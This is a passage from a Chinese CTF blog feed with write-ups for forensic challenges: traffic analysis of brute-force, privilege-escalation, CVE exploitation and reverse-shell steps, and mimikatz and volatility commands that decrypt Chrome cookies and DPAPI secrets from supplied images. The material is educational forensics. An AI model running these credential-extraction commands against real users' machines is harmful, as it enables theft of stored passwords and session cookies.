提取出来看一下结构</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202357252.png" alt="image-20240220235729184"></p><p>删掉前面的<code>-&gt;|</code>  改名为<code>1.exe</code></p><p>用pyinstxtractor.py来解析一下 发现一个<code>2.pyc</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402210006772.png" alt="image-20240221000601564"></p><p>在线反编译一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402210009827.png" alt="image-20240221000937720"></p><p>会生成一个<code>test.jpg</code>图片 运行一下 但是需要改下宽高 直接梭了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402210016206.png" alt="image-20240221001658169"></p><h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><h3 id="1-6"><a href="#1-6" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402211137806.png" alt="image-20240221113750721"></p><p>观察整个流量包 很明显的爆破过程是先扫目录 扫到登陆目录在爆破用户名爆破用户密码  先筛选一波</p><pre><code>http &amp;&amp; ip.src == 172.31.0.2 &amp;&amp; ip.dst == 172.31.0.1 &amp;&amp; http.response.code == 200</code></pre><p>观察发现 当密码不对的时候 状态码是300</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212305686.png" alt="image-20240221230515587"></p><p>继续翻找 发现一个状态码为200的包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212305979.png" alt="image-20240221230540903"></p><p>追踪tcp流 找到账号和密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212306833.png" alt="image-20240221230608763"></p><pre><code>TMjpxFGQwD:123457</code></pre><h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>一种新的筛选方法 直接筛选状态码的内容</p><pre><code>tcp contains &quot;&#123;\&quot;errCode\&quot;:200&#125;&quot;</code></pre><p>注意双引号用\转义一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212353738.png" alt="image-20240221235343684"></p><h3 id="2-6"><a href="#2-6" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212353601.png" alt="image-20240221235355531"></p><p>大致了解一下越权漏洞 就是一种越过对特定资源读写的权限的漏洞 分为水平越权和垂直越权 水平就是同级别(权限)的用户 可以越权访问、修改或者删除的非法操作 垂直又分为向下越权和向上越权 </p><p>通俗来讲就是 当权限验证做的不好的时候 抓包之后修改url后面的用户对应的参数 就可以实现越权访问</p><p>观察发现 在密码爆破结束之后是第1585个包 userid&#x3D;2</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128129.png" alt="image-20240222234629544"></p><p>拉倒最后 发现userid变成了1  实现了越权漏洞利用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128877.png" alt="image-20240222234717512"></p><p>此时的cookie为</p><pre><code>accessToken=f412d3a0378d42439ee016b06ef3330c; zyplayertoken=f412d3a0378d42439ee016b06ef3330cQzw=; userid=1</code></pre><p>进行md5加密</p><pre><code>383c74db4e32513daaa1eeb1726d7255</code></pre><h3 id="3-6"><a href="#3-6" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128473.png" alt="image-20240222235256927"></p><p>没啥技巧 就是翻就完事了 或者同第一题筛选一下也可以</p><pre><code>tcp contains &quot;jdbc&quot; &amp;&amp; tcp contains &quot;username&quot; &amp;&amp; tcp contains &quot;passwd&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128607.png" alt="image-20240223000811948"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128790.png" alt="image-20240223000828576"></p><pre><code>zyplayer:1234567</code></pre><h3 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128407.png" alt="image-20240223000903469"></p><p>在使用jdbc漏洞读取了数据库的账号密码之后 在向下翻找数据包 在1603流的内容中看到了很明显的反弹shell的语句</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242110555.png" alt="image-20240224211033469"></p><p>可以找到这个文件的名字是<code>custom.dtd.xml</code> 那向前翻找一个包 也可以找到这个文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242111087.png" alt="image-20240224211100008"></p><p>直接搜一下这段 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242112639.png" alt="image-20240224211226582"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242113327.png" alt="image-20240224211343250"></p><p>可以找到漏洞编号为<code>CVE-2022-21724</code></p><pre><code>CVE-2022-21724:custom.dtd.xml</code></pre><h3 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251559151.png" alt="image-20240225155907092"></p><p> 看到第1611个流里面 在获取系统权限之后 使用curl命令 下载了fscan工具 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251606083.png" alt="image-20240225160616995"></p><pre><code>fscan</code></pre><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><h3 id="1-7"><a href="#1-7" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251608375.png" alt="image-20240225160808322"></p><p>这个其实很明显了 TCP协议的流量 第一个包是<code>192.168.246.1</code>向<code>192.168.246.28</code>发送SYN包 表示建立连接 那肯定<code>192.168.246.28</code>就是被入侵的主机ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251623622.png" alt="image-20240225162342568"></p><pre><code>192.168.246.28</code></pre><h3 id="2-7"><a href="#2-7" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251624590.png" alt="image-20240225162401549"></p><p>也是在追踪tcp的第一个流里面 看到了输入用户名密码成功登陆被入侵主机的记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251624897.png" alt="image-20240225162450792"></p><pre><code>youcannevergetthis</code></pre><h3 id="3-7"><a href="#3-7" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251626451.png" alt="image-20240225162627383"></p><p>看到在被入侵主机里面执行了<code>ls</code>命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251645704.png" alt="image-20240225164549663"></p><p>直接横着看就行 第二个是<code>Downloads</code> </p><h3 id="4-3"><a href="#4-3" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251653428.png" alt="image-20240225165326379"></p><p>看到被入侵主机中执行了<code>cat /etc/passwd</code>命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251654211.png" alt="image-20240225165437163"></p><p>那倒数第二个用户名就是<code>mysql</code></p><h2 id="server-save"><a href="#server-save" class="headerlink" title="server_save"></a>server_save</h2><h3 id="1-8"><a href="#1-8" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252028117.png" alt="image-20240225202807050"></p><p>类似与tcpdump4的做法 先找到进入终端的流 是108流 看到是先用python创建了一个交互式终端 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252059240.png" alt="image-20240225205912166"></p><p>向前翻 第106流是一个反弹shell的文件<code>bbbb.sh</code> 第107流就是执行这个反弹shell的码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252103418.png" alt="image-20240225210303379"></p><p>105流可以看到执行了传入cmd参数 内容是id 回显内容显示此时的用户是root 说明这个时候拿到了root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252106716.png" alt="image-20240225210619658"></p><p>那前面一个流 就是拿到root权限的方法</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252106999.png" alt="image-20240225210648923"></p><p>直接搜一下这句 就找到了CVE编号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252107153.png" alt="image-20240225210712105"></p><pre><code>CVE-2022-22965</code></pre><h3 id="2-8"><a href="#2-8" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252108936.png" alt="image-20240225210811880"></p><p>这个反弹shell前面已经分析过了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252108604.png" alt="image-20240225210303379"></p><pre><code>192.168.43.128:2333</code></pre><h3 id="3-8"><a href="#3-8" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252109883.png" alt="image-20240225210912839"></p><p>这个就是翻do文件夹里面的文件系统 在<code>\home\guests</code>文件夹下找到一个<code>main</code>文件夹 放到沙箱里面分析一下 就是个elf可执行程序病毒文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252132078.png" alt="image-20240225213247982"></p><pre><code>main</code></pre><h3 id="4-4"><a href="#4-4" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252133969.png" alt="image-20240225213302908"></p><p>直接在沙箱里面看分析结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252135563.png" alt="image-20240225213502521"></p><p>添加了<code>ll</code>用户 密码明文为<code>123456</code></p><pre><code>ll:123456</code></pre><h3 id="5-2"><a href="#5-2" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252135108.png" alt="image-20240225213547063"></p><p>在沙箱的异常行为分析中 看到这个病毒文件创建了一个隐藏文件或者系统文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252137942.png" alt="image-20240225213714896"></p><p>我们看一下这个<code>.log.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252137785.png" alt="image-20240225213736742"></p><p>那就是这个ip了</p><pre><code>172.105.202.239</code></pre><h3 id="6-1"><a href="#6-1" class="headerlink" title="6"></a>6</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252138596.png" alt="image-20240225213800550"></p><p>两个文件的话 那应该就是<code>\home\guests\.idea</code>下的两个文件了 看创建日期也能判断 这是在main运行之后产生的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252140318.png" alt="image-20240225214056282"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252140884.png" alt="image-20240225214031850"></p><pre><code>lolMiner、mine_doge.sh</code></pre><h3 id="7、8"><a href="#7、8" class="headerlink" title="7、8"></a>7、8</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252141823.png" alt="image-20240225214131774"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252142603.png" alt="image-20240225214216553"></p><p>都在<code>mine_doge.sh</code>这个文件夹下了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252142041.png" alt="image-20240225214241997"></p><pre><code>POOL=doge.millpools.cc:5567WALLET=DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9.lolMinerWorker</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023陇剑杯初赛&quot;&gt;&lt;a href=&quot;#2023陇剑杯初赛&quot; class=&quot;headerlink&quot; title=&quot;2023陇剑杯初赛&quot;&gt;&lt;/a&gt;2023陇剑杯初赛&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;陇剑杯初赛的时候正好赶上我在带训 实在不好请假 遗憾错过流量分析杯 </summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="流量分析" scheme="http://w3nx1z1.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    <category term="应急响应" scheme="http://w3nx1z1.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>2024古剑山</title>
    <link href="http://w3nx1z1.github.io/2024/02/08/2023%E5%8F%A4%E5%89%91%E5%B1%B1/"/>
    <id>http://w3nx1z1.github.io/2024/02/08/2023%E5%8F%A4%E5%89%91%E5%B1%B1/</id>
    <published>2024-02-08T14:49:34.267Z</published>
    <updated>2024-02-28T07:10:08.060Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023古剑山"><a href="#2023古剑山" class="headerlink" title="2023古剑山"></a>2023古剑山</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="数独-gaps拼图"><a href="#数独-gaps拼图" class="headerlink" title="数独(gaps拼图)"></a>数独(gaps拼图)</h3><p>给了一个image.png和sudoku.png 先把数独解了一下 得到下面的结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401311803025.png" alt="image-20240131180350976"></p><p>但是不知道有什么用 再看一下image.png 需要重新拼一下图 就用gaps就行了</p><p>原图像的大小是630x630 小图片是9x9 因此使用的size参数就是70</p><pre><code>gaps --image=image.png --generations=50 --populations=200 --size=70 --save </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401311810545.jpg" alt="image_solution1"></p><p>这里我当时是以为数独有什么用 把解好的数独都写在原图片之后再拼的 实际上我们拼完之后直接按照从上到下 从左到右的顺序读flag就行</p><h3 id="幸运饼干-DPAPI技术-Chrome数据加密"><a href="#幸运饼干-DPAPI技术-Chrome数据加密" class="headerlink" title="幸运饼干(DPAPI技术 Chrome数据加密)"></a>幸运饼干(DPAPI技术 Chrome数据加密)</h3><p>附件是一个hint.jpg和flag.zip flag.zip里面有个和hint.jpg大小一样的文件 直接明文攻击 先将hint.jpg压缩为hint.zip 在ARCHPR里面进行明文攻击</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401312201871.png" alt="image-20240131211749661"></p><p>得到密码</p><pre><code>sv@1v3z</code></pre><p>解压压缩包 得到一个压缩包 一个admin.txt和Cookie文件 先看一下Cookie文件格式 用file命令 是个sql数据库文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401312237874.png" alt="image-20240131223747841"></p><p>admin.txt里面是使用mimikatz对计算机进行分析的记录  看到里面有一个NTML密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401312244139.png" alt="image-20240131224435108"></p><p>解一下 密码是<code>54231</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401312311633.png" alt="image-20240131231126598"></p><h4 id="先看一下前置知识"><a href="#先看一下前置知识" class="headerlink" title="先看一下前置知识"></a>先看一下前置知识</h4><p>DPAPI，Data Protection Application Programming Interface，是Windows系统的一个数据保护接口，它本质上使用了Windows通过用户自己登录（sids，登录密码等），以及域登录后的一些数据生成的密钥，并且使用内置的算法，对用户指定的数据进行加密。通常Windows上的浏览器历史数据，邮件加密，wifi密码等等都会以这种方式进行数据加密。</p><p>Chrome使用DPAPI保存了我们的登录密码和cookie值</p><p>用户使用Chrome访问网站进行登录时，可以选择是否保存密码。当选择保存密码时，Chrome先将密码进行加密，再保存在SQLite数据库文件中，数据库文件路径位于：</p><pre><code>%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code></pre><p>同上，保存Cookie时，数据库文件路径为：</p><pre><code>%LocalAppData%\Google\Chrome\User Data\Default\Cookies</code></pre><p>存储的cookie值被加密为DPAPI blob来进行保护；我们可以通过使用Mimikatz这个工具来对Chrome中的SQLite数据库进行解析：</p><pre><code>mimikatz dpapi::chrome /in:&#39;%LocalAppData%\Google\Chrome\User Data\Default\Cookies&#39;</code></pre><p>解密DPAPI blob用到的相关概念：</p><pre><code>DPAPI blob：一段密文，可以使用Master Key对其解密Master Key：64字节，用于解密DPAPI blob；使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中Master Key file：二进制文件，可以使用用户登录密码对其解密，得到Master Key</code></pre><p>对采用DPAPI技术加密的数据进行解密，需要获取当前操作系统登录用户对应的 Master Key，而获取 MasterKey 需要知道用户名、密码以及对应的SID，然后利用这些数据生成一个 blob 加密过程中使用的 MasterKey，从而对目标blob进行解密</p><p>大致的过程是</p><pre><code>dpapi::masterkey /in:&#123;masterkeyfile&#125; /sid:&#123;sid&#125; /password:&#123;password&#125; /protected</code></pre><p>得到masterkey之后 使用masterkey(原key值或者sha1加密值都可以)解密Cookies&#x2F;logindata</p><pre><code>dpapi::chrome /in:&#123;Cookies&#125; /masterkey:&#123;masterkey&#125; /unprotect</code></pre><p>这样就可以得到Cookies的加密数据的hex值或者直接得到明文</p><p>toto✌🏻的这篇文章写的很全面 狠狠膜拜了</p><p><a href="https://blog.csdn.net/jyttttttt/article/details/134972038?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170670869216800192291692%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=170670869216800192291692&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-134972038-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=mimikatz%20blob%E8%A7%A3%E5%AF%86&spm=1018.2226.3001.4187">电子取证中Chrome各版本解密Cookies、LoginData账号密码、历史记录</a></p><p>我们用sqlcipher打开Cooike这个sql数据库文件 看到有一个encrypted_value 提示是blob 那就是一个利用DPAPI技术加密的Chrome数据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402010011268.png" alt="image-20240201001135197"></p><p>我们结合前置知识 现在我们有了用户名 密码 在flag.zip解压后的文件里面还有一个压缩包 文件名就是SID 压缩包里面的文件应该就是masterkey文件</p><pre><code>S-1-5-21-726299542-2485387390-1117163988-1001</code></pre><p>有了这些我们就可以得到masterkey</p><pre><code>dpapi::masterkey /in:.\S-1-5-21-726299542-2485387390-1117163988-1001\e5f8e386-7041-4f16-b02d-304c71040126 /sid:S-1-5-21-726299542-2485387390-1117163988-1001 /password:54231 /protected </code></pre><p><font color='red'>这个地方遇到了几个问题 一是Cookies文件解压之后在文件夹里面是看不到的 但是用vscode打开文件夹作为工作区是可以看到的 二是注意一下最好是将文件夹或者Cookies文件直接放在mimikatz程序的文件夹中 放在其他位置有可能不出结果</font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402011958520.png" alt="image-20240201195817441"></p><p> 下面就是用masterkey解密Cookies文件</p><pre><code>dpapi::chrome /in:.\Cookies /masterkey:7a4d2ffbb42d0a1ab46f0351260aef16cae699e03e9d6514b3bf10e2977c5d228fda4a48e39b7b8a06a443c39653c2a3c3656596e7edc84e1c9682511c8343ac /unprotect</code></pre><p>直接得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402011959283.png" alt="image-20240201195956233"></p><p>另 在学习姿势的时候 还看到了一些将Cookies识别分割为数据库的方法</p><pre><code>binwalk Cookiesdd if=Cookies bs=1 skip=0 of=1.db</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012017942.png" alt="image-20240201201726904"></p><h3 id="同类型的题：-红明谷CTF-2022-MissingFile"><a href="#同类型的题：-红明谷CTF-2022-MissingFile" class="headerlink" title="同类型的题：[红明谷CTF 2022]MissingFile"></a>同类型的题：[红明谷CTF 2022]MissingFile</h3><p><font color='red'>我们再来看一下这道类似的题 主要是学习一下面对这种题的思路和解题步骤 </font></p><p>附件是一个内存镜像文件<code>memory</code> 题目描述为</p><pre><code>好像被攻击者入侵了，但是赶到现场的时候，已经只剩下一个空的文件夹了，快照能找到攻击者留下的秘密吗？</code></pre><p>首先看一下被入侵的痕迹 </p><pre><code>.\volatility.exe -f E:\Desktop\比赛\古剑山\misc\[红明谷CTF2022]MissingFile\memory --profile=Win7SP1x86_23418 hashdump</code></pre><p>可以看到有一个link3用户 还有一个NewGuest用户 既然是被入侵 那NewGuest应该就是攻击者入侵之后创建的账户 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012032769.png" alt="image-20240201203208646"></p><p>NewGuest用户的密码还是个可破解的哈希值 <code>123456</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012059018.png" alt="image-20240201205917974"></p><p>再看一下攻击用户进行的文件操作  看到使用了mimikatz的记录</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\古剑山\misc\[红明谷CTF2022]MissingFile\memory --profile=Win7SP1x86_23418 filescan | findstr &quot;NewGuest&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012031203.png" alt="image-20240201203152737"></p><p>使用 mftparser 对内存中的 MFT 条目进行分析，并将结果保存至 mftparser.txt</p><pre><code>MFT（Master File Table）是NTFS文件系统中的一个重要概念，它是用来存储文件和目录元数据的数据结构。MFT条目（MFT entry）是MFT中的一个记录，每个文件或目录在MFT中都有一个对应的MFT条目。每个MFT条目包含了文件或目录的元数据信息，如文件名、文件大小、创建时间、修改时间等。MFT条目还包含了指向文件数据的指针，以及其他一些属性信息。MFT条目的结构可以分为两部分：固定长度部分和可变长度部分。固定长度部分包含了MFT条目的基本信息，如文件类型、标志位等。可变长度部分则包含了文件属性信息，如文件名、时间戳等。MFT条目在NTFS文件系统中起着非常重要的作用，它记录了文件和目录的元数据信息，使得文件系统能够有效地管理和访问文件。通过MFT条目，文件系统可以快速定位到文件的位置和属性信息，从而实现对文件的读取和操作。</code></pre><pre><code>.\volatility.exe -f E:\Desktop\比赛\古剑山\misc\[红明谷CTF2022]MissingFile\memory --profile=Win7SP1x86_23418 mftparser &gt;mftparser.txt</code></pre><p>在扫描文件的时候 找到了一个Hacker文件夹 我们在mftparser.txt里面继续找这个文件夹 找到了里面的<code>S3cret</code>文件  将其进行保存</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402082249091.png" alt="image-20240201203830998"></p><pre><code class="python">with  open(&#39;S3cert.txt&#39;,&#39;r&#39;) as f:    data = f.readlines()    for line in data:        new_line = line[12:60:1]        print(new_line)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012057793.png" alt="image-20240201205733741"></p><p>我们使用mimikatz检查一下<code>S3cert</code>文件</p><pre><code>privilege::debug dpapi::blob /in:./S3cert</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012102545.png" alt="image-20240201210221496"></p><p>找到masterkey的guid 在mftparser.txt里面找一下这个guid</p><pre><code>470a5148-d8c9-4453-bf41-f0c09d158bfd</code></pre><p>找到了masterkey文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012105859.png" alt="image-20240201210539783"></p><p>一样 将这个masterkey文件导出来 命名为<code>470a5148-d8c9-4453-bf41-f0c09d158bfd</code></p><p>下面就和幸运饼干的步骤一样了 先得到masterkey </p><pre><code>dpapi::masterkey /in:.\470a5148-d8c9-4453-bf41-f0c09d158bfd /sid:S-1-5-21-206512979-2006505507-2644814589-1001 /password:123456 /protected</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012111117.png" alt="image-20240201211142048"></p><pre><code>092c4220064c30bc7f8b15d2d48957c4926af0632149b9c08cd87f34fc43aa1204d775bdc6ab429a0d4d0826fb80b08250b125d92913e2f7578cf778073bfe38</code></pre><p>在解密<code>S3cert</code>文件</p><pre><code>dpapi::blob /in:.\S3cert /masterkey:092c4220064c30bc7f8b15d2d48957c4926af0632149b9c08cd87f34fc43aa1204d775bdc6ab429a0d4d0826fb80b08250b125d92913e2f7578cf778073bfe38 /unprotect</code></pre><p>得到16进制的明文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012140800.png" alt="image-20240201214002735"></p><p>解一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012140718.png" alt="image-20240201214035675"></p><h3 id="i-have-the-flag"><a href="#i-have-the-flag" class="headerlink" title="i_have_the_flag"></a>i_have_the_flag</h3><p>附件是一个js文件还有一个html文件 看一下html文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012019166.png" alt="image-20240201201933126"></p><p>随便测试一下  发现输入不同错误内容的时候 回显的内容不一样 也不像base64编码 那就转向分析js文件 看到一段关键代码</p><pre><code class="javascript">function ck(s) &#123;    try &#123;        ic    &#125; catch (e) &#123;        return;    &#125;    var a = [118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54];    if (s.length == a.length) &#123;        for (i = 0; i &lt; s.length; i++) &#123;            if (a[i] - s.charCodeAt(i) != 3)                return ic = false;        &#125;        return ic = true;    &#125;    return ic = false;&#125;</code></pre><ul><li>该函数的目的是检查输入字符串是否满足特定条件，即字符串的每个字符的 ASCII 值与数组中对应位置的数字相差 3。</li><li>如果满足条件，函数返回 <code>true</code>，否则返回 <code>false</code>。</li></ul><p>很简单 我们直接将上面数组a的ascii码全部减三 在解ascii码就可以得到正确的key了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012359818.png" alt="image-20240201235958771"></p><pre><code>simpleedu123</code></pre><p>输入 就可以得到正确的值了 就是flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402020000443.png" alt="image-20240202000046406"></p><h3 id="jpginside"><a href="#jpginside" class="headerlink" title="jpginside"></a>jpginside</h3><p>附件是<code>jpginside.xxx</code>这样一个文件 不知道是什么类型的 用file命令看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402021204718.png"></p><p>是一个pyc文件 在线反编译一下</p><pre><code class="python">store = [    141,    183,    139,    129,    116,    117,    .....    49,    50]key = raw_input(&#39;Please input the key:&#39;)with open(&#39;excellent.jpg&#39;, &#39;wb&#39;) as jpg:    for i in range(len(store)):        jpg.write(chr(store[i] ^ ord(key[i % len(key)])))</code></pre><p>  先脚本恢复key 在上面的加密脚本里面用key加密的方式是对key的每一位循环使用 那我们只要取一部分明文和jpg图片格式里面相同的部分就可以恢复密钥 通过观察jpg图片结构 我们可以发现jpg的前13位都是一样的 那我们就选取这部分恢复我们的密钥</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402022347740.png" alt="image-20240202234745688"></p><pre><code class="python">encrypted_data = [0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01]# 已知的加密后的数据store = [141, 183, 139, 129, 116, 117, 123, 116, 122, 114, 33, 115, 110]# 恢复密钥的过程key = &quot;&quot;for i in range(len(store)):    original_byte = store[i] ^ encrypted_data[i]    key += chr(original_byte)print(&quot;Recovered key:&quot;, key)</code></pre><p>得到结果是</p><pre><code>rotate1234!ro</code></pre><p>那按照前面说的密钥是按位循环使用 我们就取前11位就是完整密钥</p><pre><code>rotate1234!</code></pre><p>有了密钥我们直接利用上面的加密脚本 得到exllcent.jpg</p><pre><code class="python">store = [    141,    183,    139,    129,    116,    117,    .....    49,    50]key = rotate1234!with open(&#39;excellent.jpg&#39;, &#39;wb&#39;) as jpg:    for i in range(len(store)):        jpg.write(chr(store[i] ^ ord(key[i % len(key)])))</code></pre><p>注意这个脚本的运行欢迎是python2.7 python3运行可能会报错 </p><p>得到图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402082249587.png" alt="image-20240203000535700"></p><p>看文件结构发现尾部有一个压缩包 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402030010545.png" alt="image-20240203001001490"></p><p>分离出来发现crc有问题 修改为<code>504B</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402030010997.png" alt="image-20240203001035922"></p><p>正常解压  需要密码 猜测是前面的key 得到<code>jpek.txt</code></p><pre><code>jpek&#123;39i0jf49229fie5j33f02403hj953012&#125;</code></pre><p>随波逐流梭了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402030013607.png" alt="image-20240203001322559"></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere+++"></a>Vigenere+++</h3><pre><code class="python">import sysfrom secret_file  import *def _l(idx, s):    return s[idx:] + s[:idx]def main(p, k1, k2):    s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;&quot;    t = [[_l((i+j) % len(s), s) for j in range(len(s))] for i in range(len(s))]    i1 = 0    i2 = 0    c = &quot;&quot;    for a in p:        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]        i1 = (i1 + 1) % len(k1)        i2 = (i2 + 1) % len(k2)    return cflag=&quot;flag&#123;************************&#125;&quot;key=&quot;**********&quot;# * 为马赛克，长度为1。 # hint：  可以自己尝试下运行加密函数，看看秘钥对加密结果的影响。 # hint：  首先根据线索求秘钥，秘钥不唯一，找到一个有效的，就能爆破flag了。 print main(flag, 